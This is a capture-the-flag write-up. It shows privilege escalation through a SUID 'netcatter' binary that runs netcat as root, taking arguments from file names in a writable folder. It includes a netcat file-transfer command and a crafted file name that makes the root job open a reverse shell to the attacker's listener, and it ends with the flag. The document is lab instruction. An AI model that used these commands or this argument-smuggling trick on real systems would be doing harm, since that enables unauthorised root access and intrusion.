We are shown an ip, port and credentials so we can SSH.

![image](https://user-images.githubusercontent.com/80063008/137870810-f9844233-9de0-4a4d-aa8c-94731b8a1608.png)


Inside, doing some manual enumeration, we can find in /opt/netcatter, a SUID binary called netcatter.

![image](https://user-images.githubusercontent.com/80063008/137870818-80b154aa-2467-4d7c-be8d-ee5dcb239088.png)


Transferred the binary to my machine using netcat.

On target machine:
```bash
nc 10.10.0.23 9001 < netcatter
```
On my machine:
```bash
nc -lvnp 9001 > netcatter
```
Ghidra shows the binary running /bin/nc.traditional

![image](https://user-images.githubusercontent.com/80063008/137870830-107433e0-e6b0-4655-aee6-ac4097950143.png)


Checking running processes, we can see netcatter being used to run something from the files folder in which we can write stuff. And it is running it every 60 seconds as root.

![image](https://user-images.githubusercontent.com/80063008/137870896-79202880-2e70-443b-b89b-0600e9b1b6e4.png)


I'm not great at decompilingg code but I think that while we have less then 5 arguments, it will replace the : with a space.

![image](https://user-images.githubusercontent.com/80063008/137870913-903c27c0-7005-4cd0-9855-cd3af5ce2cd0.png)


We need to create files in the files folder that would be taken as arguments by netcatter.

We create the file as seen below in order to make it run a reverse shell:

```bash
touch "10.10.0.23:9001:-c:sh"
```
On our machine we put put a listener on that port:
```bash
nc -lvnp 9001
```
And within a minute we'll catch the shell as seen in the picture below.

![image](https://user-images.githubusercontent.com/80063008/137870960-34f824ea-1ecf-4ba2-ba53-33168d60162f.png)


GPSCTF{c7f14d9a12b871c56869fb0e5932fe1a}
